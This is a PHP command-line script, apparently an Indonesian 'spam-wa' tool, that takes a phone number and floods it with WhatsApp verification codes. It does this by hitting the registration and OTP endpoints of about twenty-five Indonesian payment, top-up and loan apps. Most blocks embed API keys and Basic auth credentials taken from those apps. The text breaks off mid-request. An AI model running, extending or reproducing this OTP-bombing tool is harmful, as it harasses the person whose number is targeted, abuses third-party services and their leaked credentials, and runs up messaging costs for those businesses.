<?php

# Free Recode
# Kalo lu baik hati, Jangan lupa kasih credit gw yak
# Updated 03 April 2025

#WARNA
function color($color = "default" , $text  = null)
    {
        $arrayColor = array(
            'black_bg'   => '1;40',
            'red_bg'     => '1;41',
            'green_bg'   => '1;42',
            'yellow_bg'  => '1;43',
            'blue_bg'    => '1;44',
            'magenta_bg' => '1;45',
            'cyan_bg'    => '1;46',
            'white_bg'   => '1;47',
            'grey'       => '1;30',
            'red'        => '1;31',
            'green'      => '1;32',
            'yellow'     => '1;33',
            'blue'       => '1;34',
            'purple'     => '1;35',
            'nevy'       => '1;36',
            'white'      => '1;37',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
}

function clear() {
  //popen('cls', 'w');
  system('clear');
}
//

function fetch_value($str,$find_start,$find_end) {
  $start = @strpos($str,$find_start);
  if ($start === false) {
    return "";
  }
  $length = strlen($find_start);
  $end = strpos(substr($str,$start +$length),$find_end);
  return trim(substr($str,$start +$length,$end));
}

function imei($length = 36) {
    $characters = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function code($length = 10) {
    $characters = '1234567890';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function codex($length = 36) {
    $characters = '1234567890qwertyuioplkjhgfdsazxcvbnm';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function acak($length = 36) {
    $characters = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function serpul($nomor,$url) {
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/phone-number',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"message":"','"');
if ($result == 'Nomor terdaftar') {
  goto otpserpul;
}
elseif ($result == 'Nomor Handphone tidak terdaftar') {
}
else{
  echo " SERPUL ".$url." ".$response."\n";
}
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/register',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"full_name":"ading","phone_number":"'.$nomor.'","referrer_code":"","pin":"121212","pin_confirmation":"121212"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
otpserpul:
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/login',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"'.$nomor.'","pin":"121212","sender_id":"1"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','"}');
if ($result == 'Kode verifikasi berhasil dikirim') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SERPUL ".$url." ".$response."\n";
}}


$username = 'hanx-666'; // Nama pengguna GitHub
$repository = 'spam-wa'; // Nama repository
$branch = 'main'; // Branch atau tag yang ingin diunduh
$localFolder = __DIR__ ; // Folder tujuan
$versionFile = __DIR__ .'/version.txt'; // File versi lokal
$remoteVersionFile = "https://raw.githubusercontent.com/$username/$repository/$branch/version.txt"; // File versi di GitHub

// Fungsi untuk mendapatkan konten file dari URL
function fetchRemoteContent($url) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// Fungsi untuk mengunduh file
function downloadFile($fileURL, $localPath) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    $fileContent = file_get_contents($fileURL, false, $context);
    if ($fileContent === false) {
        echo color("red"," Error: Failed to download $fileURL\n");
        return false;
    }
    file_put_contents($localPath, $fileContent);
    //echo color("green"," Downloaded: $localPath\n");
    return true;
}

// Fungsi untuk memproses file dan folder dari GitHub
function fetchGitHubFiles($url) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    return json_decode($response, true);
}

function processGitHubFiles($files, $localFolder) {
    foreach ($files as $file) {
        if ($file['type'] === 'file') {
            $filePath = $localFolder . '/' . $file['path'];
            $dirPath = dirname($filePath);
            if (!is_dir($dirPath)) {
                mkdir($dirPath, 0777, true);
            }
            downloadFile($file['download_url'], $filePath);
        } elseif ($file['type'] === 'dir') {
            $subFolderFiles = fetchGitHubFiles($file['_links']['self']);
            processGitHubFiles($subFolderFiles, $localFolder);
        }
    }
}

lagi:
clear();
echo color("yellow"," WARNING ! ! !\n");
echo color("red"," DOSA DI TANGGUNG ANDA !\n");
sleep(5);
clear();

$versi = file_get_contents('version.txt');
echo color("green"," 𝕊𝔼-ℙ𝔸𝕄   ");
echo color("nevy","Version ".$versi."\n\n\n");

echo color("green"," 1. Whatsapp\n");
echo color("green"," 2. Pesan Manual (isi text bebas)\n");
echo color("yellow"," 3. Support Admin\n\n");
echo color("green"," Pilih : ");
$aaa1 = trim(fgets(STDIN));
if ($aaa1 == 1) {
  goto whatsapp;
}
if ($aaa1 == 2) {
  goto pesan;
}
if ($aaa1 == 3) {
  clear();
  $url = "https://github.com/hanx-666/spam-wa/blob/e6c28c4de6ca768f9f014f57a1f2fb831c674d8a/donasi.jpg";
  shell_exec("termux-open-url $url");
  echo color("green","???");
  exit();
}
else {
  echo color("red"," Pilihan Salah\n");
  sleep(2);
  goto lagi;
}

whatsapp:
clear();
echo shell_exec("cowsay -f eyes 'Code By HanX' | lolcat 2>&1");
echo color("green","\n\n\nEnter Phone Number (Using 08) : ");
//$nomor = '083117295526';
$nomor = trim(fgets(STDIN)); #08xxx
if ($nomor == '-') {
  echo color("red"," Maksud lu apa mau nge spam gw?\n");
  sleep(5);
  goto lagi;
}
$nomor2 = ltrim($nomor, '0'); #8xxx


//CANDIRELOAD
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json',
    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " CANDIRELOAD ".$response."\n";
}


//BISATOPUP
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id='.codex(16).'&version_name=6.12.04&version=61204',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'phone_number='.$nomor,
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/x-www-form-urlencoded'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','","');
if ($result == 'OTP akan segera dikirim ke perangkat') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " BISATOPUP ".$response."\n";
}



//SPEEDCASH
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/oauth/token',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'grant_type=client_credentials',
  CURLOPT_HTTPHEADER => array(
    'Authorization:  Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
    'Content-Type:  application/x-www-form-urlencoded'
  ),
));
$response = curl_exec($curl);
//echo $response;
$auth = fetch_value($response,'access_token":"','","');
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"version_name":"6.2.1 (428)","phone":"'.$nomor.'","appid":"SPEEDCASH","version_code":428,"location":"0,0","state":"REGISTER","type":"WA","app_id":"SPEEDCASH","uuid":"00000000-4c22-250d-ffff-ffff'.codex(8).'","via":"BB ANDROID"}',
  CURLOPT_HTTPHEADER => array(
    'Authorization:  Bearer '.$auth,
    'Content-Type: application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"rc":"','","');
if ($result == '00') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SPEEDCASH ".$response."\n";
}



//KERBEL
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://keranjangbelanja.co.id/api/v1/user/otp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'----dio-boundary-0879576676
content-disposition: form-data; name="phone"

'.$nomor.'
----dio-boundary-0879576676
content-disposition: form-data; name="otp"

118872
----dio-boundary-0879576676--',
  CURLOPT_HTTPHEADER => array(
    'content-type:  multipart/form-data; boundary=--dio-boundary-0879576676'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"result":"','","');
if ($result == 'OTP Berhasil Dikirimkan') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " KERBEL ".$response."\n";
}



//TITIPKU
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://titipku.tech/v1/mobile/auth/otp?method=wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"+62'.$nomor2.'","message_placeholder":"hehe"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','","');
if ($result == 'otp sent') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " TITIPKU ".$response."\n";
}




//BELANJAPARTS
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'","type":"register"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json',
    'authorization:  Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'stat_msg":"','"}');
if ($result == 'Successfully validated otp') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " BELANJAPARTS ".$response."\n";
}




//TV VOUCHER
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.tv-voucher.com/tvv/app/general/v2/checkdatawa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"countryid":"62","phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=UTF-8',
    'TVV-APIKEY:  Tvv1c8cb860b53a53451161937dff2fb5b9c2424c06b3b2dda97c02096a7f6c2'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " TV VOUCHER ".$response."\n";
}



//JOGJAKITA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://aci-user.bmsecure.id/oauth/token',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1',
  CURLOPT_HTTPHEADER => array(
    'authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==',
    'Content-Type:  application/x-www-form-urlencoded',
    'User-Agent: okhttp/4.10.0'
  ),
));
$response = curl_exec($curl);
//echo $response;
$auth = fetch_value($response,'{"access_token":"','","');
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_user":"'.$nomor.'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=UTF-8',
    'Authorization: Bearer '.$auth
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"rc":',',"');
if ($result == '200') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " JOGJAKITA ".$response."\n";
}


//ANEKAPULSA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://anekapulsa-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ANEKAPULSA ".$response."\n";
}

//GORELOAD
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://goreload-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " GORELOAD ".$response."\n";
}


//ASTRONOT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://astronot-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ASTRONOT ".$response."\n";
}



//PULSACL
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://amc-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " PULSACL ".$response."\n";
}



//ONOY
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://5.104.82.144:9858/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ONOY ".$response."\n";
}



//PULSAPINTAR
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.cl2406v3.berkah-ts.my.id/apps/users/registerotp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"name":"AGUS","pin":"111111","phone":"'.$nomor.'","kodereferal":null,"kota":"Banda Aceh","email":"AGUS'.code(5).'@gmail.com","otpType":"wa","uuid":"b787045b140c631f"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json',
    'irsauth:  f567ce1acd17b852dae4d975aedb16fe'
  ),
));
$response = curl_exec($curl);
//echo $response;
$stts = fetch_value($response,'{"success":',',"');
if ($stts == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else {
  echo " PULSAPINTAR ".$response."\n";
}


//ZONAMASTER
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ZONAMASTER ".$response."\n";
}



//MITRATOKOPULSA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://tokopulsa-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " MITRATOKOPULSA ".$response."\n";
}


//PULSAPAY
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://pulsapay.topup04.my.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " PULSAPAY ".$response."\n";
}



//MITRADELTA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone='.$nomor,
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " MITRADELTA ".$response."\n";
}





//YAGAMICELL
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://yagami-cell.com/api/main/register_awal_v2',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&email=&',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/x-www-form-urlencoded; charset=UTF-8',
    'User-Agent:  Dalvik/2.1.0 (Linux; U; Android 9; SM-G965N'
  ),
));

$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " YAGAMICELL ".$response."\n";
}


//SISEVEN
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://sisevenreload1-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SISEVEN ".$response."\n";
}

//BENGKELPOINT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api-int.gift.id/v2/merchant_wallets/otp/request',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phoneNumber":"+62'.$nomor2.'","countryCode":"ID","sessId":"'.codex(16).'","senderType":"whatsapp"}',
  CURLOPT_HTTPHEADER => array(
    'auth: basic',
    'Authorization: Basic RWZxTHExdUN6aDFyREpuQUJ4RVhnSHRKVjpnT21xN1kyVmVoOHdjWnJEZjBJOHp2cHJKb1dxT1l4eVJzZE5MNEJrTHg1Y01pOVFLbA==',
    'Content-Type: application/json'
  ),
));

$response = curl_exec($curl);
$stts = fetch_value($response,'"success":',',"');
if ($stts == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else {
  echo " BENGKELPOINT ".$response."\n";
}



//AGENPAYMENT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://agenpayment-app.findig.id/api/v1/user/register',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"name":"AAD","phone":"'.$nomor.'","email":"'.$nomor.'@gmail.com","pin":"1111","id_propinsi":"5e5005024d44ff5409347111","id_kabupaten":"5e614009360fed7c1263fdf6","id_kecamatan":"5e614059360fed7c12653764","alamat":"aceh","nama_toko":"QUARD","alamat_toko":"aceh"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json; charset=utf-8',
    'merchantcode:  63d22a4041d6a5bc8bfdb3be'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"status":',',"');
if ($result == '200') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
}
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://agenpayment-app.findig.id/api/v1/user/login',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"'.$nomor.'","pin":"1111"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json; charset=utf-8',
    'merchantcode:  63d22a4041d6a5bc8bfdb3be'
  ),
));

$response = curl_exec($curl);
//echo $response;
$auth = fetch_value($response,'validate_id":"','",');
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://agenpayment-app.findig.id/api/v1/user/login/send-otp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"codeLength":4,"validate_id":"'.$auth.'","type":"whatsapp"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json; charset=utf-8',
    'merchantcode:  63d22a4041d6a5bc8bfdb3be'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"status":',',"');
if ($result == '200') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " AGENPAYMENT ".$response."\n";
}



//Z4RELOAD
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json',
    'authorization:  7117c8f459a98282c2c576b519d0662f',
  ),
));

$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " Z4RELOAD ".$response."\n";
}



//ZONAMASTER
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ZONAMASTER ".$response."\n";
}


//PINJAMDUIT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/x-www-form-urlencoded'
  ),
));
$response = curl_exec($curl);
//echo $response;
if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " PINJAMDUIT ".$response."\n";
}




//SINGA
$curl = curl_init();
curl_setopt_array($curl, array(
